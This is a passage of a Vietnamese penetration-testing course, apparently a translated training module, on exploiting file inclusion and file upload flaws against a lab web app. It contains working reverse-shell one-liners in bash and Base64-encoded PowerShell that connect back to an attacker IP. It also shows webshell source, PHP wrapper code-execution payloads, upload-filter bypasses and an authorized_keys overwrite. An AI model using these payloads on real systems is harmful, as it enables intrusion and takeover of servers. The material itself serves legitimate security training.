bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

                                               *Liệt kê 17 – Bash reverse shell chạy qua `bash -c`*

Ta sẽ **mã hóa URL** các ký tự đặc biệt:

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

                                     *Liệt kê 18 – One-liner Bash TCP reverse shell đã URL-encode*

Hình sau minh họa cách thêm lệnh vào request:

![image.png](image%2012.png)

                                    ***Hình 13: Reverse shell Bash đã encode trong tham số `cmd`***

Trước khi gửi request, hãy **mở listener Netcat** trên cổng **4444** ở máy Kali để nhận shell. Khi listener đã chạy, bấm **Send** trong Burp để gửi request.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```

                                            *Liệt kê 19 – Reverse shell thành công từ hệ thống đích*

*Liệt kê 19* cho thấy ta đã nhận được **reverse shell** trong Netcat. Giờ ta có **interactive shell** trên máy đích.

Trước khi kết thúc, hãy điểm qua **LFI trên Windows**. Việc khai thác LFI trên Windows **khác Linux** chủ yếu ở **đường dẫn tệp** và **cách thực thi**. Đoạn PHP dùng trong phần Linux **cũng hoạt động trên Windows**, vì `system` của PHP **độc lập** với HĐH bên dưới. Khi **Log Poisoning** trên Windows, đường dẫn log **phụ thuộc ứng dụng**. Ví dụ, nếu đích chạy **XAMPP,** log của Apache nằm ở: `C:\xampp\apache\logs\`.

Khai thác lỗ hổng File Inclusion **phụ thuộc rất nhiều** vào **ngôn ngữ** của ứng dụng web, **phiên bản**, và **cấu hình** máy chủ. Ngoài PHP, ta cũng có thể gặp **LFI/RFI** trong các framework hoặc ngôn ngữ **server-side** khác như **Perl**, **Active Server Pages Extended**, **Active Server Pages**, và **Java Server Pages**. Cách khai thác giữa các ngôn ngữ này **khá tương đồng**.

Xét một lỗ hổng LFI trong ứng dụng **JSP**: nếu ta ghi được **mã JSP** vào một tệp bằng Log Poisoning và **include** tệp đó qua LFI, mã sẽ **được thực thi**. Khác biệt duy nhất so với ví dụ PHP ở trên chỉ là **ngôn ngữ** của đoạn code dùng để Poisoning.

Trong thực tế, ta thường gặp **File Inclusion** trong **ứng dụng PHP**, vì phần lớn framework/ngôn ngữ khác đã cũ nên ít gặp hơn, hoặc framework hiện đại có cơ chế **phòng vệ mặc định** trước LFI. Tuy nhiên, cần lưu ý ta vẫn có thể thấy LFI trong **môi trường back-end JavaScript hiện đại** như **Node.js**.

---

## 2.2. PHP Wrappers

---

PHP cung cấp nhiều **protocol wrapper** để mở rộng khả năng của ngôn ngữ. Ví dụ, các wrapper có thể được dùng để **đại diện và truy cập** hệ thống tệp **cục bộ** hoặc **từ xa**. Ta có thể tận dụng các wrapper này để **vượt lọc** hoặc **giành thực thi mã** thông qua lỗ hổng **File Inclusion** trong ứng dụng PHP. Ở đây ta chỉ xem hai wrapper `php://filter` và `data://`, nhưng thực tế có rất nhiều wrapper khác.

Ta có thể dùng **`php://filter`** để **hiển thị nội dung tệp** với hoặc không kèm các **mã hóa/biến đổi** như **ROT13** hoặc **Base64**. Ở phần trước, ta đã dùng LFI để **include nội dung tệp**. Với **`php://filter`**, ta còn có thể **hiển thị nội dung các tệp thực thi** (như `.php`) **thay vì chạy chúng**. Điều này cho phép ta **xem mã PHP** để tìm thông tin nhạy cảm và phân tích logic ứng dụng.

Hãy minh họa bằng cách quay lại ứng dụng **“Mountain Desserts”**. Trước hết, truyền **`admin.php`** làm giá trị tham số **`page`**, giống như Learning Unit trước:

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

                                                          *Liệt kê 20 – Nội dung tệp `admin.php`*

*Liệt kê 20* cho thấy **tiêu đề** và thông báo **bảo trì** ta đã thấy trước đó. Cũng dễ nhận ra thẻ `<body>` **không đóng** ở cuối HTML, nên có thể **thiếu gì đó**. Mã PHP được **thực thi phía server** nên **không hiển thị** ở đây. So sánh với các lần include trước hoặc xem **source** trên trình duyệt, ta kết luận **phần còn lại** của nội dung trang `index.php` **không xuất hiện**.

Tiếp theo, ta sẽ include tệp nhưng dùng **`php://filter`** để hiểu rõ hơn. Lần đầu **không áp dụng mã hóa** nào. Wrapper này dùng tham số **`resource`** để chỉ định **file stream** cần “lọc” (ở đây là **tên tệp**). Ta có thể dùng **đường dẫn tuyệt đối** hoặc **tương đối** trong tham số này.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

                                *Liệt kê 21 – Dùng `php://filter` include `admin.php` (không mã hóa)*

Kết quả *Liệt kê 21* giống *Liệt kê 20*, hợp lý vì **mã PHP vẫn được thực thi** thông qua LFI. Giờ ta **mã hóa Base64** đầu ra bằng cách thêm **`convert.base64-encode`** — bộ lọc này sẽ **chuyển nội dung tệp thành chuỗi Base64**:

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

                           *Liệt kê 22 – Dùng `php://filter` include `admin.php` và mã hóa Base64*

*Liệt kê 22* cho thấy **dữ liệu Base64** đã được include, trong khi phần còn lại của trang **vẫn tải bình thường**. Bây giờ ta có thể dùng chương trình **`base64 -d`** để **giải mã**:

```
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

                                          *Liệt kê 23 – Giải mã nội dung Base64 của `admin.php`*

Dữ liệu đã giải mã **tiết lộ thông tin kết nối MySQL** (username/password). Ta có thể dùng để truy cập DB hoặc **thử mật khẩu** qua SSH cho tài khoản người dùng.

Ngoài `php://filter` dùng để **hiển thị nội dung tệp**, ta có **`data://`** để **thực thi mã**. Wrapper này cho phép **nhúng dữ liệu** (plain text hoặc Base64) **trực tiếp vào mã** của ứng dụng đang chạy. Đây là **cách thay thế** khi ta **không thể Poison** tệp cục bộ bằng mã PHP.

Tiếp tục với **“Mountain Desserts”**, để dùng wrapper này ta thêm **`data://`** theo sau là **loại dữ liệu** và **nội dung**. Ví dụ đầu tiên, ta nhúng **đoạn PHP đã URL-encode** để chạy lệnh `ls`:

```
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

                                                     *Liệt kê 24 – Dùng `data://` để thực thi `ls`*

*Liệt kê 24* cho thấy dữ liệu nhúng **đã được thực thi** thông qua lỗ hổng File Inclusion kết hợp `data://`.

Khi có **WAF** hoặc cơ chế bảo vệ khác, chuỗi như `"system"` hoặc thành phần PHP có thể bị lọc. Khi đó, ta có thể dùng **`data://` với dữ liệu Base64**. Trước tiên **mã hóa** snippet PHP sang Base64, rồi **embed & thực thi**:

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

                                                      *Liệt kê 25 – Dùng `data://` với dữ liệu Base64*

*Liệt kê 25* chứng minh ta **đã thực thi mã thành công** bằng snippet PHP **mã hóa Base64** — kỹ thuật hữu ích để **vượt qua bộ lọc cơ bản**. Tuy nhiên, lưu ý **`data://` sẽ không hoạt động trên cấu hình PHP mặc định**. Để khai thác, cần bật tùy chọn `allow_url_include`.

---

## 2.3. Remote File Inclusion

---

**Remote File Inclusion (RFI)** ít gặp hơn **LFI** vì hệ thống đích phải được cấu hình theo cách nhất định. Trong ứng dụng PHP, chẳng hạn, tùy chọn **`allow_url_include`** cần được bật mới có thể lợi dụng RFI (giống yêu cầu khi dùng wrapper **`data://`** ở phần trước). Như đã nêu, tùy chọn này **mặc định bị tắt** trên mọi phiên bản PHP hiện nay.

Nếu **LFI** cho phép include **tệp cục bộ**, thì **RFI** cho phép include **tệp từ hệ thống từ xa** qua **HTTP** hoặc **SMB**. Tệp được include cũng **được thực thi** trong ngữ cảnh của ứng dụng web. Các tình huống hay gặp khi tùy chọn này được bật là ứng dụng **tải thư viện/nội dung từ xa** (VD: thư viện, dữ liệu ứng dụng). Ta có thể phát hiện lỗ hổng RFI bằng **các kỹ thuật giống** phần Directory Traversal và LFI.

Kali Linux có sẵn vài **PHP webshell** trong thư mục **`/usr/share/webshells/php/`** có thể dùng cho RFI. **Webshell** là script nhỏ cung cấp **giao diện dòng lệnh qua web**, giúp thực thi lệnh thuận tiện hơn. Trong ví dụ này, ta sẽ dùng webshell **`simple-backdoor.php`** để khai thác lỗ hổng RFI trong ứng dụng **“Mountain Desserts”**.

Trước hết, xem nhanh nội dung của webshell `simple-backdoor.php`. Ta sẽ dùng nó để kiểm tra khả năng RFI (trên nền lỗ hổng LFI đã có). Mã gần giống đoạn PHP đã dùng trước đó: nhận lệnh qua tham số **`cmd`** và thực thi bằng hàm **`system`**.

```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

                                 *Liệt kê 26 – Vị trí và nội dung webshell `simple-backdoor.php`*

Để lợi dụng RFI, ta cần làm cho **tệp từ xa** (remote file) **truy cập được** từ máy đích. Có thể dùng mô-đun **`http.server`** của **Python3** để dựng **web server** trên máy Kali và **phục vụ tệp** muốn include từ xa. `http.server` đặt **web root** là **thư mục hiện tại** của terminal.

Ta cũng có thể dùng **tệp công khai** (ví dụ từ GitHub).

```
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

                                                    *Liệt kê 27 – Khởi động `python3 -m http.server`*

Sau khi web server chạy với **`/usr/share/webshells/php/`** là thư mục hiện tại, ta đã hoàn tất các bước trên **máy tấn công**. Tiếp theo, dùng **`curl`** để **include tệp webshell qua HTTP** và chỉ định lệnh **`ls`**:

```
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>
```

                                       *Liệt kê 28 – Khai thác RFI với PHP backdoor và thực thi `ls`*

*Liệt kê 28* cho thấy ta đã **khai thác RFI thành công** bằng cách include **webshell lưu trữ từ xa**. Từ đây, tương tự phần LFI, ta có thể dùng **Netcat** để tạo **reverse shell** và nhận **interactive shell** trên hệ thống đích.

---

# 3. Lỗ hổng Tải tệp lên

---

**Learning Unit** này bao gồm các **Mục tiêu học tập**:

- Hiểu lỗ hổng **File Upload**
- Học cách **nhận diện** lỗ hổng File Upload
- Khám phá **các vector khai thác** khác nhau của lỗ hổng File Upload

Nhiều ứng dụng web cung cấp chức năng tải tệp lên. Trong Learning Unit này, chúng ta sẽ học cách **nhận diện**, **khai thác** và **tận dụng** lỗ hổng File Upload để truy cập hệ thống bên dưới hoặc **thực thi mã**. Nhìn chung, có thể nhóm lỗ hổng File Upload thành **ba** loại:

**(1) Cho phép tải lên tệp có thể được ứng dụng web thực thi.**

Ví dụ: nếu ta có thể tải một **script PHP** lên máy chủ nơi PHP được bật, ta có thể **thực thi** script đó bằng cách truy cập qua trình duyệt hoặc `curl`. Như đã thấy trong Learning Unit về **File Inclusion**, ngoài PHP, ta cũng có thể lợi dụng kiểu lỗ hổng này trên các **framework** hoặc **ngôn ngữ script phía server** khác.

**(2) Phải kết hợp cơ chế tải tệp với một lỗ hổng khác** (như **Directory Traversal**).

Ví dụ: nếu ứng dụng web dính Directory Traversal, ta có thể dùng **đường dẫn tương đối** trong **yêu cầu tải tệp** để thử **ghi đè** các tệp như `authorized_keys`. Ngoài ra, ta cũng có thể kết hợp cơ chế tải tệp với XML External Entity (XXE) hoặc Cross-Site Scripting (XSS). Chẳng hạn, nếu được phép tải **ảnh đại diện** với kiểu **SVG**, ta có thể **nhúng XXE** để hiển thị nội dung tệp hoặc thậm chí **thực thi mã**.

**(3) Phụ thuộc vào tương tác người dùng.**

Ví dụ: khi tìm thấy **form nộp hồ sơ xin việc**, ta có thể thử tải lên **CV định dạng .docx** có tích hợp **macro độc hại**. Vì loại này **cần có người** mở tệp đã tải lên, trong Learning Unit này chúng ta sẽ **tập trung** vào **hai loại đầu** của lỗ hổng File Upload.

---

## 3.1. Sử dụng tệp thực thi

---

Trong phần này, ta xem xét một lỗ hổng **tải tệp lên** cho phép tải các tệp **được máy chủ web thực thi**. Tương tự **Directory Traversal** và **File Inclusion**, điều quan trọng là biết **cách nhận diện** lỗ hổng **File Upload**.

Tùy ứng dụng web và mục đích sử dụng, ta có thể **phỏng đoán vị trí** cơ chế upload. Nếu là **CMS (Content Management System)**, thường có nơi tải **avatar**, hoặc **đính kèm tệp** khi tạo bài/blog/trang. Nếu là website doanh nghiệp, hay có **khu vực tuyển dụng** hoặc kênh upload theo **ngành nghề** (ví dụ văn phòng luật sư có thể cho tải **hồ sơ vụ án**). Đôi khi cơ chế upload **không hiển nhiên**; vì thế **không bao giờ bỏ qua giai đoạn enumeration** khi làm việc với ứng dụng web.

Trong ví dụ này, ta sẽ **lạm dụng cơ chế upload** để đạt **thực thi mã** và lấy **reverse shell**. Mở ứng dụng **“Mountain Desserts”** trên **MOUNTAIN VM**: vào Firefox, truy cập `http://192.168.50.189/meteor/`.

![image.png](image%2013.png)

                                          ***Hình 14: Ứng dụng “Mountain Desserts” bản cập nhật***

Ở bản mới, liên kết **Admin** đã được thay bằng **form upload**. Thanh tab hiển thị **biểu tượng XAMPP**, gợi ý ứng dụng chạy **stack XAMPP**. Phần mô tả nói công ty muốn chuyển sang **Windows**, do đó có thể **máy chủ đang chạy Windows**. Hãy thử xem có thể tải **tệp văn bản** thay vì ảnh không.

```
kali@kali:~$ echo "this is a test" > test.txt
```

                                                        *Liệt kê 29 – Tạo tệp văn bản thử nghiệm*

Tải `test.txt` qua form trên trình duyệt.

![image.png](image%2014.png)

                                                           ***Hình 15: Upload `test.txt` thành công***

Ta đã tải được **tệp văn bản**, vậy cơ chế upload **không giới hạn chỉ ảnh**. Tiếp theo, thử tải **webshell** `simple-backdoor.php` đã dùng ở phần trước.

![image.png](image%2015.png)

                                                   ***Hình 16: Upload `simple-backdoor.php` thất bại***

Ứng dụng **chặn** và báo **không cho phép PHP**, **đưa đuôi PHP vào blacklist**. Vì **không rõ bộ lọc** triển khai thế nào, ta sẽ **thử–sai** để tìm cách vượt.

Một cách là đổi sang **đuôi PHP ít phổ biến hơn** như `.phps` hoặc `.php7` — có thể **vượt** các bộ lọc chỉ kiểm đuôi phổ biến như `.php`, `.phtml`. Những đuôi thay thế này chủ yếu dùng cho **PHP đời cũ** hoặc **tình huống đặc biệt**, nhưng **vẫn được hỗ trợ** vì lý do tương thích.

Cách khác là **viết hoa** một số ký tự trong **đuôi tệp**. Nếu blacklist so sánh theo **chữ thường**, đổi đuôi sang có **chữ hoa** có thể **vượt lọc**.

Hãy thử cách thứ hai: đổi đuôi `simple-backdoor.php` thành **`simple-backdoor.pHP`**. Đổi tên (terminal hoặc file explorer), rồi upload lại.

![image.png](image%2016.png)

                                           ***Hình 17: Upload `simple-backdoor.pHP` thành công***

Thay đổi nhỏ đã **vượt filter** và upload được tệp. Kiểm tra xem có thể **thực thi lệnh** như phần RFI không. Kết quả cho biết tệp được tải vào thư mục **`uploads`**.

Dùng `curl` truyền lệnh **`dir`** qua tham số `cmd` của webshell vừa upload:

```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:23 AM    <DIR>          .
04/04/2022  06:23 AM    <DIR>          ..
04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
               2 File(s)            343 bytes
               2 Dir(s)  15,410,925,568 bytes free
...
```

                                          *Liệt kê 30 – Thực thi lệnh `dir` qua webshell đã upload*

Đầu ra của `dir` xác nhận ta **đã thực thi lệnh** trên máy đích. Dù bypass khá đơn giản, kiểu bypass này thường **rất hiệu quả**.

Giờ ta **lấy reverse shell** từ máy đích. Mở **Netcat listener** ở terminal khác, lắng nghe cổng **4444**:

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

                                          *Liệt kê 31 – Khởi động Netcat lắng nghe cổng 4444*

Dùng **PowerShell one-liner** để reverse shell. Vì one-liner có nhiều ký tự đặc biệt, ta sẽ **mã hóa Base64**. Có thể dùng **PowerShell** hoặc **trình mã hóa trực tuyến**.

Trong demo này, dùng **PowerShell trên Kali** để mã hóa. Tạo biến **`$Text`** chứa one-liner, sau đó dùng `[System.Text.Encoding]::Unicode` và `[Convert]::ToBase64String(...)` để encode:

```
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

PS> exit
```

                                      *Liệt kê 32 – Mã hóa one-liner trong PowerShell trên Linux*

Biến **`$EncodedText`** chứa one-liner **đã Base64**. Dùng `curl` để thực thi one-liner này qua `simple-backdoor.pHP`. Thêm chuỗi Base64 cho lệnh `powershell -enc`; đồng thời **URL-encode khoảng trắng**:

```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

                                     *Liệt kê 33 – Gửi one-liner reverse shell đã Base64 bằng `curl`*

Sau khi thực thi, ta sẽ nhận **kết nối reverse shell** ở terminal có Netcat:

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```

                                                     *Liệt kê 34 – Reverse shell đổ về thành công*

Như vậy, ta đã nhận **reverse shell** thông qua **one-liner Base64**. Tuyệt!

Trong phần này, ta đã **lạm dụng cơ chế upload** của ứng dụng PHP để đạt **thực thi mã** bằng cách upload **webshell** từ máy Kali. Nếu mục tiêu dùng **ASP** thay vì PHP, quy trình **tương tự**; chỉ đổi sang **webshell ASP**. Kali có sẵn nhiều webshell cho các **framework/ngôn ngữ** đã bàn, nằm ở **`/usr/share/webshells/`**:

```
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x   2 root root  4096 Feb 11 01:58 asp
drwxr-xr-x   2 root root  4096 Apr 25 07:25 aspx
drwxr-xr-x   2 root root  4096 Feb 11 01:58 cfm
drwxr-xr-x   2 root root  4096 Apr 25 07:06 jsp
lrwxrwxrwx   1 root root    19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x   2 root root  4096 Feb 11 01:58 perl
drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
```

                                                  *Liệt kê 35 – Danh sách thư mục webshells trên Kali*

Lưu ý: các **đuôi tệp webshell** có thể bị **blacklist** bởi filter/cơ chế upload. Trong tình huống như vậy, có thể **vượt lọc** như ta đã làm. Ngoài ra, nhiều ứng dụng có tính năng **đổi tên/chỉnh sửa tệp** sau khi upload; ta có thể **upload tệp “vô hại” (ví dụ `.txt`)**, sau đó **đổi lại đuôi gốc** của webshell để thực thi.

---

## 3.2. Sử dụng tệp **không** thực thi

---

Trong phần này, ta sẽ xem vì sao lỗi ở chức năng upload **vẫn có thể nguy hiểm** ngay cả khi kẻ tấn công **không thể thực thi** tệp đã tải lên. Có những tình huống ta tìm thấy cơ chế upload “không hạn chế”, nhưng **không khai thác được** để chiếm hệ thống. Ví dụ như **Google Drive**: ta có thể tải bất kỳ tệp nào, nhưng **không thể** dùng nó để chiếm quyền hệ thống. Khi gặp trường hợp như vậy, ta cần **kết hợp một lỗ hổng khác** (ví dụ **Directory Traversal**) để lạm dụng cơ chế upload.

Hãy khám phá bản cập nhật ứng dụng “Mountain Desserts” tại:

`http://mountaindesserts.com:8000`.

![image.png](image%2017.png)

                                   ***Hình 18: Ứng dụng Mountain Desserts chạy trên Windows***

Ta thấy phiên bản mới **vẫn cho tải tệp**. Phần mô tả lại cho biết phiên bản này chạy trên **Linux**. Ngoài ra **không còn** liên kết **Admin** ở cuối trang, và **URL không có** `index.php`. Dùng `curl` kiểm tra xem `admin.php` và `index.php` còn tồn tại không:

```
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```

                                                        *Liệt kê 36 – Truy cập các tệp PHP thất bại*

*Liệt kê 36* cho thấy `index.php` và `admin.php` **không còn**. Ta có thể giả định web server **không dùng PHP** nữa. Thử upload tệp văn bản: mở **Burp** để bắt request, dùng form trên web để upload `test.txt` (từ phần trước).

![image.png](image%2018.png)

                                                     ***Hình 19: Upload tệp văn bản thành công***

Kết quả hiển thị là **tải thành công**.

Khi thử form upload, ta **luôn** nên kiểm tra **chuyện gì xảy ra nếu upload trùng tên**. Nếu ứng dụng báo “tệp đã tồn tại”, ta có thể lợi dụng để **brute force cấu trúc** của web server. Nếu ứng dụng **hiện thông báo lỗi**, lỗi đó có thể tiết lộ **ngôn ngữ lập trình** hoặc **công nghệ web** đang dùng.

Xem lại request upload `test.txt` trong Burp: chọn **POST** trong **HTTP history**, **Send to Repeater**, rồi **Send**.

![image.png](image%2019.png)

                                       ***Hình 20: Request POST upload `test.txt` trong Burp***

Kết quả giống trên trình duyệt, **không có** thông tin giá trị mới. Tiếp theo, kiểm tra xem ứng dụng có cho **đường dẫn tương đối trong tên tệp** để **ghi file ra ngoài web root** (Directory Traversal) hay không. Ta sửa tham số **`filename`** trong request thành `../../../../../../../test.txt`, rồi **Send**.

![image.png](image%2020.png)

                         ***Hình 21: Đường dẫn tương đối trong filename để ghi ra ngoài web root***

Phần Response hiển thị các chuỗi `../`. Tiếc là ta **không thể biết** ứng dụng có **thực sự dùng** đường dẫn tương đối để đặt file hay chỉ **echo** tên file rồi **sanitize** nội bộ. Trước mắt, vì **chưa có vector khác**, ta **giả định** đường dẫn tương đối **được dùng** để ghi file. Nếu đúng, ta có thể thử **ghi đè mù** (blind overwrite) — có thể dẫn tới chiếm hệ thống. Lưu ý: trong pentest thực tế, ghi đè mù có thể gây **mất dữ liệu** hoặc **gián đoạn** hệ thống sản xuất.

Về **tài khoản/quyền** của web server: các ứng dụng chạy trên Apache, Nginx… thường dùng **user chuyên dụng**, ví dụ **`www-data`** (Linux). Truyền thống trên Windows, IIS chạy dưới **Network Service** (tài khoản tích hợp ít quyền, không mật khẩu). Từ **IIS 7.5**, Microsoft giới thiệu **IIS Application Pool Identities**: các **tài khoản ảo** chạy ứng dụng theo **application pool**; mỗi pool có **pool identity riêng**, giúp **phân quyền chính xác** hơn.

Khi dùng **ngôn ngữ có sẵn web server** tích hợp, quản trị/Dev đôi khi **deploy chạy thẳng** với quyền **root/Administrator** để “đỡ vướng permission”. Vì thế, luôn kiểm tra xem lỗ hổng upload có thể **nâng quyền** nhờ chạy dưới **root/Administrator** không.

Giờ ta thử **ghi đè `authorized_keys`** trong thư mục home của **root**. Nếu tệp này chứa **public key** khớp với **private key** ta giữ, ta có thể **SSH vào hệ thống** với quyền root. Ta sẽ tạo **SSH keypair** bằng `ssh-keygen`, sau đó tạo tệp `authorized_keys` chứa **public key** vừa tạo.

```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

                                      *Liệt kê 37 – Chuẩn bị tệp `authorized_keys` để upload*

Sau khi `authorized_keys` chứa public key của ta, hãy upload nó với **đường dẫn tương đối**:

